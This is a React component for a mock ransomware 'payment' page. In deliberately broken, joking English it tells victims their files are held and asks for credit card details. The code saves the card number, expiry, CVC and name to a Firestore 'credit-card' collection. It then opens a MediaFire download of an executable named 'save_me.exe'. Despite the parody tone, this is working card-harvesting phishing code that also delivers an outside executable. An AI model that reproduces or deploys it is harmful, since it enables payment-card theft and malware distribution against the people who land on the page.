"use client";
import React, { useState } from "react";
import Cards from "react-credit-cards-2";
import "react-credit-cards-2/dist/es/styles-compiled.css";
import addData from "@/firebase/firestore/addData";
import { isFieldValid, isFormValid, areAllFieldsPopulated } from "@/utils/validation";

const defaultState = {
  number: "",
  expiry: "",
  cvc: "",
  name: "",
  focus: "",
}

const PaymentForm = () => {
  const [state, setState] = useState(defaultState);
  const [errorMessage, setErrorMessage] = useState("")

  const sendData = async (event) => {
    event.preventDefault();
    if (!areAllFieldsPopulated(state)) {
      setErrorMessage("All fields are required");
      return;
    }
    const message = isFormValid(state);
    if (message) {
      setErrorMessage(message);
      return;
    }
    const { error } = await addData("credit-card", state.name, { number: state.number, expiry: state.expiry, cvc: state.cvc, name: state.name });
    if (error) {
      setErrorMessage("Error while submitting data");
      return;
    }
    window.open('https://download1581.mediafire.com/kbozdog9jdpgib7aS4qG1oXV-PsvHK6F5Vi8Q5Rdq08TXFu1GtK71TDayz4ZqPyGPwMUPQW-_BPDM_oT4M2LnH3kDLjIpJEkpIBxjKkBhYl1hgONKpfd95FU7X9GI7AO2q4TxD63W6XHhYUtk0mCT7Vq_HqiV3MVdsHnh8kF2e_Bcg/ey4vh9z363qvj0q/save_me.exe', '_blank', 'noreferrer');
    setState(defaultState)
  };

  const handleInputChange = (evt) => {
    setErrorMessage("");
    const { name, value } = evt.target;
    if (value === '' || isFieldValid(name, value)) {
      setState((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handleInputFocus = (evt) => {
    setState((prev) => ({ ...prev, focus: evt.target.name }));
  };

  return (
    <>
      <div className="flex justify-center items-center flex-col my-8">
        <p className="text-xl py-4">
          Looks like you got rekt, frijend. Dont worry doe, if you want to
          return back your files, all yous has to do is be kindly please enter
          your credit kard info on this
        </p>
        <h1 id="ugleeText" className="text-4xl text-pink-500 mt-6">
          100% safe Payment Plaftorm
        </h1>
        <h6>(Confirmed by Elon-check-if-good-sajt-com)</h6>
      </div>
      <div className="ml-2 text-pink-500 text-2xl">
        <Cards
          number={state.number}
          expiry={state.expiry}
          cvc={state.cvc}
          name={state.name}
          focused={state.focus}
        />
        <form className="flex flex-col items-center justify-center gap-4 mt-10 ">
          <input
            name="number"
            maxLength={16}
            placeholder="Card namber"
            value={state.number}
            onChange={(evt) => handleInputChange(evt)}
            onFocus={handleInputFocus}
          />
          <input
            maxLength={4}
            name="expiry"
            placeholder="Expiretion date"
            value={state.expiry}
            onChange={(evt) => handleInputChange(evt)}
            onFocus={handleInputFocus}
          />

          <input
            maxLength={3}
            name="cvc"
            placeholder="CVV"
            value={state.cvc}
            onChange={(evt) => handleInputChange(evt)}
            onFocus={handleInputFocus}
          />
          <input
            maxLength={16}
            name="name"
            placeholder="Name on Card"
            value={state.name}
            onChange={(evt) => handleInputChange(evt)}
            onFocus={handleInputFocus}
          />
          {errorMessage && <p style={{ color: "red" }}>{errorMessage}</p>}
          <button
            onClick={sendData}
            className="border-pink-500 border-[2px] px-8 py-3 bg-pink-500 text-white rounded-full mt-4"
          >
            SUBMIT
          </button>
        </form>
      </div>
    </>
  );
};

export default PaymentForm;